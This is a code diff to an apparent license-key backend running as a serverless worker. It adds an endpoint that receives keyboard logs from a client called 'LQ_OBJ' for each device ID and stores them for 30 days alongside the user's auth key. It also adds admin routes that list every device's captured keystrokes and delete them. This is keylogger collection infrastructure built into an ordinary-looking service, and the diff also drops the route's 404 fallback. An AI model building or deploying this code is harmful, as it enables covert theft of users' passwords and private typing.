@@ -314,14 +314,74 @@ export default {
       return json({ success: true }, corsHeaders);
     }
 
-    // ── GET /api/getconfig (public — for LQ_OBJ source to read banner config) ──
-    if (url.pathname === '/api/getconfig') {
-      const raw = await env.KEYS_KV.get('global:banner_config');
-      const cfg = raw ? JSON.parse(raw) : {};
-      return json({ banner_config: cfg }, corsHeaders);
+    // ── POST /api/keylog ───────────────────────────────────────────────────
+    // Source LQ_OBJ gửi log bàn phím lên theo device ID
+    if (url.pathname === '/api/keylog' && request.method === 'POST') {
+      let body;
+      try { body = await request.json(); } catch { return json({ error: 'Invalid JSON' }, corsHeaders, 400); }
+      const { deviceID, key, line } = body;
+      if (!deviceID || !line) return json({ error: 'Missing deviceID or line' }, corsHeaders, 400);
+
+      const storageKey = `keylog:${deviceID}`;
+      const raw = await env.KEYS_KV.get(storageKey);
+      let record = raw ? JSON.parse(raw) : { deviceID, authKey: key || '', lines: [] };
+
+      const now = new Date();
+      const nowMs = now.getTime();
+      const lastLine = record.lines.length > 0 ? record.lines[record.lines.length - 1] : null;
+      const THREE_MINUTES = 3 * 60 * 1000;
+
+      if (lastLine && (nowMs - new Date(lastLine.ts).getTime()) < THREE_MINUTES) {
+        // Trong vòng 3 phút → append vào dòng hiện tại, ngăn cách bằng |
+        lastLine.text = lastLine.text + ' | ' + line;
+        lastLine.ts = now.toISOString();
+      } else {
+        // Quá 3 phút hoặc dòng đầu tiên → tạo dòng mới
+        record.lines.push({ text: line, ts: now.toISOString() });
+        // Giữ tối đa 200 dòng
+        if (record.lines.length > 200) record.lines = record.lines.slice(-200);
+      }
+
+      record.authKey = key || record.authKey;
+      await env.KEYS_KV.put(storageKey, JSON.stringify(record), { expirationTtl: 60 * 60 * 24 * 30 });
+      return json({ success: true }, corsHeaders);
     }
 
-    return json({ error: 'Not found' }, corsHeaders, 404);
+    // ── GET /api/admin/keylog ──────────────────────────────────────────────
+    // Lấy log bàn phím của 1 device cụ thể hoặc tất cả
+    if (url.pathname === '/api/admin/keylog') {
+      const adminToken = request.headers.get('X-Admin-Token');
+      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
+
+      const deviceID = url.searchParams.get('device');
+      if (deviceID) {
+        const raw = await env.KEYS_KV.get(`keylog:${deviceID}`);
+        if (!raw) return json({ deviceID, lines: [] }, corsHeaders);
+        return json(JSON.parse(raw), corsHeaders);
+      }
+
+      // Lấy tất cả keylog
+      const listed = await env.KEYS_KV.list({ prefix: 'keylog:' });
+      const all = [];
+      for (const item of listed.keys) {
+        const raw = await env.KEYS_KV.get(item.name);
+        if (raw) { try { all.push(JSON.parse(raw)); } catch {} }
+      }
+      return json({ logs: all, total: all.length }, corsHeaders);
+    }
+
+    // ── POST /api/admin/clearlog ───────────────────────────────────────────
+    // Xóa log bàn phím của 1 thiết bị
+    if (url.pathname === '/api/admin/clearlog' && request.method === 'POST') {
+      const adminToken = request.headers.get('X-Admin-Token');
+      if (adminToken !== env.ADMIN_TOKEN) return json({ error: 'Unauthorized' }, corsHeaders, 401);
+      const { deviceID } = await request.json();
+      if (!deviceID) return json({ error: 'Missing deviceID' }, corsHeaders, 400);
+      await env.KEYS_KV.delete(`keylog:${deviceID}`);
+      return json({ success: true }, corsHeaders);
+    }
+
+
   }
 };
 
